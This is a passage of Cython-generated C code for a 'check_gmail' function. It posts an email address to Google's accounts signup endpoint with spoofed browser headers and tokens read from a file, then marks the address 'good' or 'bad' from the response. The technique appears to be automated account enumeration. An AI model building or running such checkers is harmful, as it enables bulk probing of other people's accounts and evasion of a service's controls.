    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_GetItemInt_List(__pyx_t_4, 0, long, 1, __Pyx_PyInt_From_long, 1, 0, 1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 160, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF_SET(__pyx_v_email, __pyx_t_3);
    __pyx_t_3 = 0;

    
  }

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_6, &__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_7);
    /*try:*/ {

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_9, &__pyx_t_10);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_10);
        /*try:*/ {

          
          __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__17, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 163, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_read); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 163, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __pyx_t_11 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_11)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_11);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
            }
          }
          __pyx_t_4 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 163, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 163, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_4)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_4);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
            }
          }
          __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 163, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_GetItemInt(__pyx_t_3, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 163, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_v_o = __pyx_t_12;
          __pyx_t_12 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        goto __pyx_L15_try_end;
        __pyx_L10_error:;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;

        
        __pyx_t_13 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
        if (__pyx_t_13) {
          __Pyx_AddTraceback("source.check_gmail", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_12, &__pyx_t_3, &__pyx_t_4) < 0) __PYX_ERR(0, 164, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_GOTREF(__pyx_t_4);

          
          __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_tll); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 165, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_15 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_14))) {
            __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_14);
            if (likely(__pyx_t_15)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
              __Pyx_INCREF(__pyx_t_15);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_14, function);
            }
          }
          __pyx_t_11 = (__pyx_t_15) ? __Pyx_PyObject_CallOneArg(__pyx_t_14, __pyx_t_15) : __Pyx_PyObject_CallNoArg(__pyx_t_14);
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 165, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

          
          __pyx_t_15 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__17, NULL); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 166, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_15);
          __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_15, __pyx_n_s_read); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 166, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          __pyx_t_15 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
            __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_16);
            if (likely(__pyx_t_15)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
              __Pyx_INCREF(__pyx_t_15);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_16, function);
            }
          }
          __pyx_t_14 = (__pyx_t_15) ? __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_t_15) : __Pyx_PyObject_CallNoArg(__pyx_t_16);
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 166, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 166, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
            __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_16);
            if (likely(__pyx_t_14)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
              __Pyx_INCREF(__pyx_t_14);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_16, function);
            }
          }
          __pyx_t_11 = (__pyx_t_14) ? __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_t_14) : __Pyx_PyObject_CallNoArg(__pyx_t_16);
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 166, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = __Pyx_GetItemInt(__pyx_t_11, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 166, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_XDECREF_SET(__pyx_v_o, __pyx_t_16);
          __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          goto __pyx_L11_exception_handled;
        }
        goto __pyx_L12_except_error;
        __pyx_L12_except_error:;

        
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
        goto __pyx_L4_error;
        __pyx_L11_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
        __pyx_L15_try_end:;
      }

      
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_o, __pyx_n_s_split); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 167, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_12 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_12)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_12);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_3, function);
        }
      }
      __pyx_t_4 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_12, __pyx_kp_u__13) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_u__13);
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 167, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if ((likely(PyTuple_CheckExact(__pyx_t_4))) || (PyList_CheckExact(__pyx_t_4))) {
        PyObject* sequence = __pyx_t_4;
        Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
        if (unlikely(size != 2)) {
          if (size > 2) __Pyx_RaiseTooManyValuesError(2);
          else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
          __PYX_ERR(0, 167, __pyx_L4_error)
        }
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        if (likely(PyTuple_CheckExact(sequence))) {
          __pyx_t_3 = PyTuple_GET_ITEM(sequence, 0); 
          __pyx_t_12 = PyTuple_GET_ITEM(sequence, 1); 
        } else {
          __pyx_t_3 = PyList_GET_ITEM(sequence, 0); 
          __pyx_t_12 = PyList_GET_ITEM(sequence, 1); 
        }
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_12);
        #else
        __pyx_t_3 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 167, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_12 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 167, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_12);
        #endif
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      } else {
        Py_ssize_t index = -1;
        __pyx_t_16 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 167, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_17 = Py_TYPE(__pyx_t_16)->tp_iternext;
        index = 0; __pyx_t_3 = __pyx_t_17(__pyx_t_16); if (unlikely(!__pyx_t_3)) goto __pyx_L18_unpacking_failed;
        __Pyx_GOTREF(__pyx_t_3);
        index = 1; __pyx_t_12 = __pyx_t_17(__pyx_t_16); if (unlikely(!__pyx_t_12)) goto __pyx_L18_unpacking_failed;
        __Pyx_GOTREF(__pyx_t_12);
        if (__Pyx_IternextUnpackEndCheck(__pyx_t_17(__pyx_t_16), 2) < 0) __PYX_ERR(0, 167, __pyx_L4_error)
        __pyx_t_17 = NULL;
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        goto __pyx_L19_unpacking_done;
        __pyx_L18_unpacking_failed:;
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_17 = NULL;
        if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
        __PYX_ERR(0, 167, __pyx_L4_error)
        __pyx_L19_unpacking_done:;
      }
      __pyx_v_tl = __pyx_t_3;
      __pyx_t_3 = 0;
      __pyx_v_host = __pyx_t_12;
      __pyx_t_12 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 168, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Host_GAPS, __pyx_v_host) < 0) __PYX_ERR(0, 168, __pyx_L4_error)
      __pyx_v_cookies = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 170, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_authority, __pyx_kp_u_accounts_google_com) < 0) __PYX_ERR(0, 170, __pyx_L4_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_accept, __pyx_kp_u__5) < 0) __PYX_ERR(0, 170, __pyx_L4_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_accept_language, __pyx_kp_u_en_US_en_q_0_9) < 0) __PYX_ERR(0, 170, __pyx_L4_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 170, __pyx_L4_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_google_accounts_xsrf, __pyx_kp_u_1) < 0) __PYX_ERR(0, 170, __pyx_L4_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_origin, __pyx_kp_u_https_accounts_google_com) < 0) __PYX_ERR(0, 170, __pyx_L4_error)

      
      __pyx_t_12 = PyNumber_Add(__pyx_kp_u_https_accounts_google_com_signup_2, __pyx_v_tl); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 176, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_12);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_referer, __pyx_t_12) < 0) __PYX_ERR(0, 170, __pyx_L4_error)
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_gg); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 177, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_16 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_16)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_16);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_3, function);
        }
      }
      __pyx_t_12 = (__pyx_t_16) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_16) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 177, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_user_agent, __pyx_t_12) < 0) __PYX_ERR(0, 170, __pyx_L4_error)
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_v_headers = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 178, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_TL, __pyx_v_tl) < 0) __PYX_ERR(0, 178, __pyx_L4_error)
      __pyx_v_params = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = PyNumber_Add(__pyx_kp_u_continue_https_3A_2F_2Fmail_goog, __pyx_v_tl); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 179, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_12 = PyNumber_Add(__pyx_t_4, __pyx_kp_u_22_2C_22); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 179, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyNumber_Add(__pyx_t_12, __pyx_v_email); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 179, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = PyNumber_Add(__pyx_t_4, __pyx_kp_u_22_2C0_2C0_2C1_2Cnull_2C0_2C516); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 179, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_data = __pyx_t_12;
      __pyx_t_12 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_pp); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 181, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_12);

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 183, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_params, __pyx_v_params) < 0) __PYX_ERR(0, 183, __pyx_L4_error)

      
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_cookies, __pyx_v_cookies) < 0) __PYX_ERR(0, 183, __pyx_L4_error)

      
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 183, __pyx_L4_error)

      
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 183, __pyx_L4_error)

      
      __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_tuple__18, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 181, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_response = __pyx_t_3;
      __pyx_t_3 = 0;

      
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 187, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 187, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_2 = (__Pyx_PyUnicode_ContainsTF(__pyx_kp_u_gf_uar_1, __pyx_t_4, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 187, __pyx_L4_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_1 = (__pyx_t_2 != 0);
      if (__pyx_t_1) {

        
        __Pyx_XDECREF(__pyx_r);
        __Pyx_INCREF(__pyx_n_u_good);
        __pyx_r = __pyx_n_u_good;
        goto __pyx_L8_try_return;

        
      }

      
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 189, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 189, __pyx_L4_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_1 = (__Pyx_PyUnicode_ContainsTF(__pyx_kp_u_er_null_null_null_null_400, __pyx_t_3, Py_EQ)); if (unlikely(__pyx_t_1 < 0)) __PYX_ERR(0, 189, __pyx_L4_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_2 = (__pyx_t_1 != 0);
      if (__pyx_t_2) {

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_tll); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 190, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_12 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
          }
        }
        __pyx_t_3 = (__pyx_t_12) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_12) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 190, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_check_gmail); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 191, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_12 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
          }
        }
        __pyx_t_3 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_12, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_v_email);
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 191, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

        
        goto __pyx_L20;
      }

      
      /*else*/ {
        __Pyx_XDECREF(__pyx_r);
        __Pyx_INCREF(__pyx_n_u_bad);
        __pyx_r = __pyx_n_u_bad;
        goto __pyx_L8_try_return;
      }
      __pyx_L20:;

      
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    goto __pyx_L9_try_end;
    __pyx_L4_error:;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;

    
    __pyx_t_13 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_13) {
      __Pyx_AddTraceback("source.check_gmail", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_4, &__pyx_t_12) < 0) __PYX_ERR(0, 194, __pyx_L6_except_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_12);

      
      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_check_gmail); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 195, __pyx_L6_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_14 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
        __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_11);
        if (likely(__pyx_t_14)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
          __Pyx_INCREF(__pyx_t_14);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_11, function);
        }
      }
      __pyx_t_16 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_14, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_v_email);
      __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
      if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 195, __pyx_L6_except_error)
      __Pyx_GOTREF(__pyx_t_16);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      goto __pyx_L5_exception_handled;
    }
    goto __pyx_L6_except_error;
    __pyx_L6_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    goto __pyx_L1_error;
    __pyx_L8_try_return:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    goto __pyx_L0;
    __pyx_L5_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    __pyx_L9_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_XDECREF(__pyx_t_16);
